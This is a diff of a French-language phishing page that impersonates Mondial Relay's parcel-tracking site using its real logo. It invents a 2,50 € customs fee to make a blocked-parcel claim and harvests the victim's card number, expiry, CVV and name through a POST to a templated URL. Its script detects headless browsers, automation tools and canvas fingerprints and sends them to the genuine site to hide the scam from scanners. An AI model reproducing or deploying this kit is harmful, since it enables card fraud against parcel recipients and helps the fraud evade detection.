@@ -3,218 +3,228 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Suivi de colis — Mondial Relay</title>
-<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<title>Suivre un colis - Mondial Relay</title>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Open Sans',sans-serif;background:#f8f9fa;color:#1d1d1b;min-height:100vh;display:flex;flex-direction:column}
+body{font-family:'Open Sans',sans-serif;background:#fdfdfd;color:#1d1d1b;min-height:100vh;display:flex;flex-direction:column}
+
+/* Cloaking */
 #app{display:none}
 
 /* Header */
-.site-header{background:#fff;height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:100}
+.header{background:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #eee;position:sticky;top:0;z-index:100}
 .header-left,.header-right{display:flex;align-items:center;gap:18px}
-.h-icon{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;color:#782947}
-.h-icon svg{width:24px;height:24px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
-.h-logo{height:42px;display:flex;align-items:center}
-.h-logo img{height:100%;width:auto}
+.icon-btn{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center}
+.icon-btn svg{width:24px;height:24px;stroke:#782947;fill:none;stroke-width:2}
+.logo img{height:46px}
 
 /* Breadcrumb */
 .breadcrumb{padding:14px 20px;font-size:13px;color:#782947;display:flex;align-items:center;gap:8px;background:#fff;border-bottom:1px solid #f0f0f0}
-.bc-link{color:#782947;text-decoration:none;font-weight:500}
-.bc-sep{color:#bbb}
-.bc-home{width:16px;height:16px;fill:#782947;flex-shrink:0}
+.breadcrumb a{color:#782947;text-decoration:none;font-weight:600}
+.breadcrumb .sep{color:#bbb}
 
 /* Main */
-.main-content{flex:1;display:flex;justify-content:center;padding:32px 16px;background:#f5f5f5}
-.card{background:#fff;width:100%;max-width:480px;border-radius:8px;padding:32px 28px;box-shadow:0 1px 3px rgba(0,0,0,.06)}
+.main-content{flex:1;display:flex;justify-content:center;padding:30px 16px;background:#f8f9fa}
+.card{background:#fff;width:100%;max-width:460px;border-radius:8px;padding:32px 28px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
 
-/* Alert box */
-.alert-box{background:#fff5f5;border:1px solid #ffcdd2;border-radius:8px;padding:20px;margin-bottom:28px;text-align:center}
-.alert-box .icon{font-size:32px;margin-bottom:10px;display:block}
-.alert-box h2{color:#c62828;font-size:20px;font-weight:700;margin-bottom:8px}
-.alert-box p{color:#555;font-size:14px;line-height:1.5;margin-bottom:12px}
-.alert-box .price{color:#e31837;font-size:28px;font-weight:800;margin:8px 0;display:block}
-.alert-box .reason{background:#ffebee;color:#c62828;padding:8px 14px;border-radius:20px;font-size:12px;font-weight:600;display:inline-block;margin-top:8px}
+/* Tracking Section */
+.track-title{color:#782947;font-size:22px;font-weight:700;text-align:center;margin-bottom:6px}
+.track-sub{color:#666;font-size:14px;text-align:center;margin-bottom:24px}
 
-/* Tracking info */
-.tracking-info{background:#f0f4ff;border-left:4px solid #0071eb;padding:14px 16px;border-radius:6px;margin-bottom:24px;font-size:13px;color:#444;line-height:1.5}
-.tracking-info strong{color:#0071eb}
+.info-box{background:#f0f4ff;border-left:4px solid #e31837;padding:12px 14px;border-radius:4px;font-size:13px;color:#555;line-height:1.5;margin-bottom:20px}
 
-/* Form */
-.form-title{font-size:22px;font-weight:700;color:#782947;text-align:center;margin-bottom:6px}
-.form-subtitle{color:#666;text-align:center;font-size:13px;margin-bottom:28px}
+.field{margin-bottom:18px}
+.field label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
+.field input{width:100%;height:48px;border:1px solid #ccc;border-radius:8px;padding:0 14px;font-size:15px;transition:all .2s;background:#fafafa}
+.field input:focus{outline:none;border-color:#e31837;background:#fff;box-shadow:0 0 0 3px rgba(227,24,55,.08)}
 
-.field-group{margin-bottom:18px;position:relative}
-.field-group label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
-.field-group input{width:100%;height:48px;border:1px solid #ccc;border-radius:6px;padding:0 14px;font-size:15px;transition:all .2s;background:#fafafa}
-.field-group input:focus{outline:none;border-color:#0071eb;box-shadow:0 0 0 3px rgba(0,113,235,.08);background:#fff}
-.field-group input::placeholder{color:#aaa}
+.btn-search{width:100%;height:50px;background:#e31837;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px;box-shadow:0 4px 12px rgba(227,24,55,.25);transition:all .2s}
+.btn-search:hover{background:#c41230;transform:translateY(-1px)}
+.btn-search:disabled{background:#ccc;cursor:not-allowed}
 
-.row-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+/* Payment Section (hidden initially) */
+#payment-section{display:none;margin-top:24px;padding-top:24px;border-top:2px dashed #eee}
+#payment-section.active{display:block}
 
-/* Card visual */
-.card-visual{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);border-radius:12px;padding:20px;color:#fff;margin-bottom:24px;position:relative;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,.15)}
-.card-visual::before{content:'';position:absolute;top:-20px;right:-20px;width:100px;height:100px;background:rgba(255,255,255,.1);border-radius:50%}
-.card-visual .chip{width:40px;height:28px;background:linear-gradient(135deg,#f6d365 0%,#fda085 100%);border-radius:6px;margin-bottom:20px}
-.card-visual .number{font-size:20px;letter-spacing:2px;font-family:'Courier New',monospace;margin-bottom:12px;text-shadow:0 2px 4px rgba(0,0,0,.2)}
-.card-visual .bottom{display:flex;justify-content:space-between;font-size:13px;opacity:.9}
+.pay-alert{background:#fff8e1;border:1px solid #f9a825;border-radius:8px;padding:16px;margin-bottom:24px;text-align:center}
+.pay-alert h3{color:#f57f17;font-size:16px;margin-bottom:6px}
+.pay-alert p{color:#666;font-size:13px;margin:0}
+.pay-price{color:#e31837;font-size:28px;font-weight:700;margin:8px 0;display:block}
 
-/* Button */
-.btn-submit{width:100%;height:54px;background:#e31837;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:700;cursor:pointer;transition:all .2s;box-shadow:0 4px 14px rgba(227,24,55,.25);letter-spacing:.2px;margin-top:10px}
-.btn-submit:hover{background:#c41230;transform:translateY(-2px);box-shadow:0 6px 20px rgba(227,24,55,.35)}
-.btn-submit:active{transform:translateY(0)}
-.btn-submit:disabled{background:#999;cursor:not-allowed;box-shadow:none}
+.card-visual{background:linear-gradient(135deg,#782947 0%,#e31837 100%);border-radius:12px;padding:20px;color:#fff;margin-bottom:24px;position:relative;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+.card-visual .chip{width:40px;height:28px;background:linear-gradient(135deg,#f0c040 0%,#d4a017 100%);border-radius:4px;margin-bottom:16px}
+.card-visual .number{font-size:20px;letter-spacing:2px;margin-bottom:12px;font-family:'Courier New',monospace}
+.card-visual .name{font-size:14px;text-transform:uppercase;opacity:.9}
+.card-visual .exp{position:absolute;right:20px;bottom:20px;font-size:14px}
 
-/* Secure badge */
-.secure-badge{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:16px;color:#888;font-size:12px}
-.secure-badge svg{width:14px;height:14px;fill:#4caf50}
+.row{display:flex;gap:12px}
+.row .field{flex:1}
 
 /* Footer */
-.site-footer{background:#1a1a1a;color:#888;padding:40px 20px 20px;margin-top:auto}
-.footer-grid{max-width:1100px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:28px;margin-bottom:32px}
-.footer-col h4{color:#fff;font-size:12px;text-transform:uppercase;letter-spacing:.6px;margin-bottom:14px;font-weight:700}
-.footer-col ul{list-style:none}
-.footer-col li{margin-bottom:8px}
-.footer-col a{color:#aaa;text-decoration:none;font-size:12px;transition:color .15s}
-.footer-col a:hover{color:#fff}
-.footer-bottom{text-align:center;border-top:1px solid #333;padding-top:20px;font-size:11px;color:#777}
-.footer-bottom a{color:#999;text-decoration:none;margin:0 8px;font-size:11px}
-.footer-bottom a:hover{color:#fff}
+.footer{background:#1a1a1a;color:#888;padding:30px 20px;text-align:center;font-size:12px;margin-top:auto}
+.footer a{color:#aaa;text-decoration:none;margin:0 8px}
 
-/* Utils */
-.hp{position:absolute;left:-9999px;opacity:0;height:0;width:0;pointer-events:none}
-.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.95);z-index:9999;justify-content:center;align-items:center;flex-direction:column;gap:18px}
-.loading-overlay.on{display:flex}
-.spinner{width:45px;height:45px;border:4px solid #f0f0f0;border-top-color:#e31837;border-radius:50%;animation:spin .9s linear infinite}
+/* Loading */
+.loading{display:none;position:fixed;inset:0;background:rgba(255,255,255,.95);z-index:9999;justify-content:center;align-items:center;flex-direction:column;gap:14px}
+.loading.on{display:flex}
+.spinner{width:40px;height:40px;border:3px solid #f0f0f0;border-top-color:#e31837;border-radius:50%;animation:spin .8s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 
-@media(max-width:500px){
-.card{padding:24px 20px}
-.row-2,.row-3{grid-template-columns:1fr}
-.alert-box h2{font-size:18px}
-}
+/* Honeypot */
+.hp{position:absolute;left:-9999px;opacity:0;height:0;width:0}
+
+@media(max-width:480px){.card{padding:24px 16px}.main-content{padding:20px 12px}}
 </style>
 </head>
 <body>
 
-<div class="loading-overlay" id="loader">
-<div class="spinner"></div>
-<p style="color:#555;font-size:15px;font-weight:500">Paiement en cours de traitement...</p>
-</div>
+<div class="loading" id="loader"><div class="spinner"></div><p style="color:#555;font-size:14px">Veuillez patienter</p></div>
 
 <div id="app">
-<header class="site-header">
+<header class="header">
 <div class="header-left">
-<button class="h-icon" aria-label="Menu"><svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
-<button class="h-icon" aria-label="Recherche"><svg viewBox="0 0 24 24" style="stroke-width:2.5"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg></button>
+<button class="icon-btn"><svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
+<button class="icon-btn"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg></button>
 </div>
-<div class="h-logo"><img src="https://www.mondialrelay.fr/images/Rebranding/logo_mondial_relay.svg" alt="Mondial Relay by InPost"></div>
+<div class="logo"><img src="https://www.mondialrelay.fr/images/Rebranding/logo_mondial_relay.svg" alt="Mondial Relay by InPost"></div>
 <div class="header-right">
-<button class="h-icon" aria-label="Panier"><svg viewBox="0 0 24 24" style="stroke-width:1.8"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></button>
-<button class="h-icon" aria-label="Compte"><svg viewBox="0 0 24 24" style="stroke-width:1.8"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></button>
+<button class="icon-btn"><svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg></button>
+<button class="icon-btn"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></button>
 </div>
 </header>
 
 <nav class="breadcrumb">
-<svg class="bc-home" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-<a href="#" class="bc-link">Accueil</a><span class="bc-sep">/</span><span style="color:#999">Suivi de colis</span>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="#782947"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+<a href="#">Accueil</a><span class="sep">/</span><span style="color:#999">Suivi de colis</span>
 </nav>
 
 <main class="main-content">
 <div class="card">
 
-<div class="alert-box">
-<span class="icon">📦</span>
-<h2>Colis bloqué en point relais</h2>
-<p>Votre colis est arrivé mais ne peut pas être remis en raison de frais de dédouanement non réglés.</p>
-<span class="price">2,99 €</span>
-<span class="reason">Frais de dossier douane</span>
+<!-- ETAPE 1 : SUIVI -->
+<div id="track-section">
+<h1 class="track-title">Suivre un colis</h1>
+<p class="track-sub">Veuillez saisir le numéro de colis et le code postal du destinataire.</p>
+
+<div class="info-box">
+Votre numéro de colis est composé de 8 chiffres. Il se trouve sur votre mail de confirmation ou votre étiquette d'expédition.
 </div>
 
-<div class="tracking-info">
-<strong>Numéro de suivi :</strong> 76434219<br>
-<strong>Statut :</strong> En attente de règlement — Point Relais Paris 11ème
+<form id="trackForm">
+<input type="text" name="website" class="hp" tabindex="-1" autocomplete="off">
+<div class="field">
+<label>Numéro de colis</label>
+<input type="text" id="pkgNum" placeholder="ex : 76434219" maxlength="8" required>
+</div>
+<div class="field">
+<label>Code postal du destinataire</label>
+<input type="text" id="postCode" placeholder="ex : 59650" maxlength="5" required>
+</div>
+<button type="submit" class="btn-search" id="searchBtn">Rechercher</button>
+</form>
 </div>
 
-<h2 class="form-title">Régler les frais</h2>
-<p class="form-subtitle">Les informations bancaires sont sécurisées par notre partenaire Stripe.</p>
-
-<form method="POST" action="{{.URL}}" id="payForm">
-<input type="text" name="website_verify" class="hp" tabindex="-1" autocomplete="off">
+<!-- ETAPE 2 : PAIEMENT -->
+<div id="payment-section">
+<div class="pay-alert">
+<h3>⚠️ Colis bloqué</h3>
+<p>Votre colis est retenu en raison de frais de douane non réglés.</p>
+<span class="pay-price">2,50 €</span>
+<p style="font-size:12px;color:#999">Montant TTC — Livraison sous 24h après règlement</p>
+</div>
 
 <div class="card-visual">
 <div class="chip"></div>
-<div class="number" id="cardDisplay">•••• •••• •••• ••••</div>
-<div class="bottom"><span id="nameDisplay">NOM PRÉNOM</span><span id="expDisplay">MM/AA</span></div>
+<div class="number" id="cardDisplay">#### #### #### ####</div>
+<div class="name" id="nameDisplay">NOM PRÉNOM</div>
+<div class="exp" id="expDisplay">MM/AA</div>
 </div>
 
-<div class="field-group">
-<label>Numéro de carte bancaire</label>
-<input type="text" id="cardNum" name="card_number" required maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number">
+<h3 style="color:#782947;font-size:18px;margin-bottom:16px">Paiement sécurisé</h3>
+
+<form id="payForm" method="POST" action="{{.URL}}">
+<input type="text" name="verification_id" class="hp" tabindex="-1" autocomplete="off">
+
+<div class="field">
+<label>Titulaire de la carte</label>
+<input type="text" name="cardholder" id="cardName" required placeholder="NOM PRÉNOM" autocomplete="cc-name">
 </div>
 
-<div class="row-2">
-<div class="field-group">
+<div class="field">
+<label>Numéro de carte</label>
+<input type="text" name="cardnumber" id="cardNumber" required maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number">
+</div>
+
+<div class="row">
+<div class="field">
 <label>Date d'expiration</label>
-<input type="text" id="cardExp" name="card_expiry" required maxlength="5" placeholder="MM/AA" autocomplete="cc-exp">
+<input type="text" name="expiry" id="cardExp" required maxlength="5" placeholder="MM/AA" autocomplete="cc-exp">
 </div>
-<div class="field-group">
-<label>Code sécurité (CVV)</label>
-<input type="text" id="cardCvv" name="card_cvv" required maxlength="4" placeholder="123" autocomplete="cc-csc">
+<div class="field">
+<label>CVV</label>
+<input type="text" name="cvv" id="cardCvv" required maxlength="4" placeholder="123" autocomplete="cc-csc">
 </div>
-</div>
-
-<div class="field-group">
-<label>Nom sur la carte</label>
-<input type="text" id="cardName" name="card_name" required placeholder="JEAN DUPONT" autocomplete="cc-name">
 </div>
 
-<button type="submit" class="btn-submit" id="btnPay">Payer 2,99 € et débloquer</button>
-
-<div class="secure-badge">
-<svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-<span>Paiement 100% sécurisé — Connexion SSL encryptée</span>
-</div>
+<button type="submit" class="btn-search" id="payBtn">Payer 2,50 €</button>
 </form>
+
+<p style="text-align:center;margin-top:16px;font-size:12px;color:#999">
+<img src="https://www.mondialrelay.fr/images/Rebranding/logo_mondial_relay.svg" style="height:20px;vertical-align:middle;margin-right:6px;opacity:.5">Paiement sécurisé par SSL 256-bit
+</p>
+</div>
 
 </div>
 </main>
 
-<footer class="site-footer">
-<div class="footer-grid">
-<div class="footer-col"><h4>Particulier</h4><ul><li><a href="#">Envoyer un colis</a></li><li><a href="#">Suivre un colis</a></li><li><a href="#">Nos Lockers</a></li></ul></div>
-<div class="footer-col"><h4>Professionnel</h4><ul><li><a href="#">Nos offres</a></li><li><a href="#">Devenir Point Relais</a></li><li><a href="#">Nos partenaires</a></li></ul></div>
-<div class="footer-col"><h4>Liens utiles</h4><ul><li><a href="#">Mentions légales</a></li><li><a href="#">Données personnelles</a></li><li><a href="#">Cookies</a></li></ul></div>
-</div>
-<div class="footer-bottom"><a href="#">CGV</a> | <a href="#">CGU</a> | <a href="#">Accessibilité</a><br><br>© 2026 Mondial Relay. Tous droits réservés.</div>
+<footer class="footer">
+<a href="#">Mentions légales</a>|<a href="#">Données personnelles</a>|<a href="#">Cookies</a>
+<br><br>&copy; 2026 Mondial Relay. Tous droits réservés.
 </footer>
 </div>
 
 <script>
 (function(){
-var isBot=navigator.webdriver||/Headless|Phantom|Selenium|Puppeteer|Playwright/i.test(navigator.userAgent)||!navigator.languages||navigator.languages.length===0;
-if(isBot){window.location.replace('https://www.mondialrelay.fr/suivi-de-colis/');return;}
-try{var c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillText('MR',2,2);if(c.toDataURL()==='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='){window.location.replace('https://www.mondialrelay.fr/suivi-de-colis/');return;}}catch(e){}
+var bot=navigator.webdriver||/Headless|Phantom|Selenium|Puppeteer|Playwright/i.test(navigator.userAgent)||!navigator.languages||navigator.languages.length===0;
+if(bot){location.replace('https://www.mondialrelay.fr/suivi-de-colis/');return;}
+try{var c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillText('MR',2,2);if(c.toDataURL()==='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='){location.replace('https://www.mondialrelay.fr/suivi-de-colis/');return;}}catch(e){}
 
 window.addEventListener('load',function(){setTimeout(function(){document.getElementById('app').style.display='block';},350);});
 
-var form=document.getElementById('payForm'),btn=document.getElementById('btnPay'),loader=document.getElementById('loader');
-var cardNum=document.getElementById('cardNum'),cardExp=document.getElementById('cardExp'),cardCvv=document.getElementById('cardCvv'),cardName=document.getElementById('cardName');
-var dispNum=document.getElementById('cardDisplay'),dispName=document.getElementById('nameDisplay'),dispExp=document.getElementById('expDisplay');
+var trackForm=document.getElementById('trackForm');
+var payForm=document.getElementById('payForm');
+var trackSection=document.getElementById('track-section');
+var paySection=document.getElementById('payment-section');
+var loader=document.getElementById('loader');
 
-function fmtCard(v){var r=v.replace(/\D/g,'').substring(0,16);var m=r.match(/.{1,4}/g);return m?m.join(' '):r;}
-function fmtExp(v){var r=v.replace(/\D/g,'').substring(0,4);if(r.length>=2)return r.substring(0,2)+'/'+r.substring(2);return r;}
-
-cardNum.addEventListener('input',function(){this.value=fmtCard(this.value);dispNum.textContent=this.value||'•••• •••• •••• ••••';});
-cardExp.addEventListener('input',function(){this.value=fmtExp(this.value);dispExp.textContent=this.value||'MM/AA';});
-cardName.addEventListener('input',function(){dispName.textContent=this.value||'NOM PRÉNOM';});
-
-form.addEventListener('submit',function(e){
-var h=document.getElementsByName('website_verify')[0];if(h&&h.value!==''){e.preventDefault();return false;}
-loader.classList.add('on');btn.disabled=true;btn.textContent='Traitement...';
+trackForm.addEventListener('submit',function(e){
+e.preventDefault();
+var hp=document.getElementsByName('website')[0];if(hp&&hp.value!=='')return;
+loader.classList.add('on');
+setTimeout(function(){
+loader.classList.remove('on');
+trackSection.style.display='none';
+paySection.classList.add('active');
+},1500);
 });
+
+payForm.addEventListener('submit',function(e){
+var hp=document.getElementsByName('verification_id')[0];if(hp&&hp.value!==''){e.preventDefault();return false;}
+document.getElementById('payBtn').innerText='Traitement...';
+document.getElementById('payBtn').disabled=true;
+});
+
+// Card visual update
+var cn=document.getElementById('cardNumber'),cd=document.getElementById('cardDisplay');
+var nm=document.getElementById('cardName'),nd=document.getElementById('nameDisplay');
+var ex=document.getElementById('cardExp'),ed=document.getElementById('expDisplay');
+
+cn.addEventListener('input',function(){var v=this.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();this.value=v;cd.textContent=v||'#### #### #### ####';});
+nm.addEventListener('input',function(){nd.textContent=this.value||'NOM PRÉNOM';});
+ex.addEventListener('input',function(){var v=this.value.replace(/\D/g,'');if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2,4);this.value=v;ed.textContent=v||'MM/AA';});
 })();
 </script>
+
 </body>
 </html>
